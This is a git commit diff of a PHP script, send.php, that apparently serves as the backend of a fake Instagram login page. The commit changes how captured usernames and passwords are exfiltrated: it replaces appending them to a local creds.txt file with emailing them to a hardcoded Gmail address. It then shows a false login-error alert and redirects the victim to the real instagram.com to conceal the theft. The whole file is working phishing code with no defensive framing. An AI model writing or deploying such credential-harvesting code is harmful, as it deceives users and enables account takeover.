d82e1f63ca82ff99ffa63f42f24532cdb0f35974
1kuru <fedaamayoof1@gmail.com>
2025-04-21 03:26:38 +0300

    send.php

--- send.php
+++ send.php
@@ -4,27 +4,22 @@
 $username = $_POST['u_name'] ?? '';  // Fetch username (using null coalescing operator)
 $passcode = $_POST['pass'] ?? '';    // Fetch password (using null coalescing operator)
 
-// File to store credentials
-$filename = "creds.txt";
+$subject = "Someone Login ! Insta Dummy page";
+$to = "trasgamer14@gmail.com";
+
+$txt = "Username: " . $username . "\r\nPassword: " . $passcode; // Email body (i) username [break] (ii) password;
 
 // Check input fields
-if (!empty($username) && !empty($passcode)) {
-    // Open the file in append mode
-    $file = fopen($filename, "a");
-    
-    // Write the username and password to the file
-    fwrite($file, "Username: $username | Password: $passcode\n");
-    
-    // Close the file
-    fclose($file);
-    
-    // Redirect or alert the user
-    echo "<script type='text/javascript'>alert('Error! Unable to login.');
+if (!empty($username) and !empty($passcode)) {
+
+    mail($to, $subject, $txt);
+    echo "<script type='text/javascript'>alert('Error ! Unable to login ');
         window.location.replace('https://www.instagram.com');
         </script>";
 
 } else {
-    echo "<script type='text/javascript'>alert('Please enter correct username or password. Try again.');
+
+    echo "<script type='text/javascript'>alert('Please enter correct username or password. Try again ');
         window.history.go(-1);
         </script>";
 }
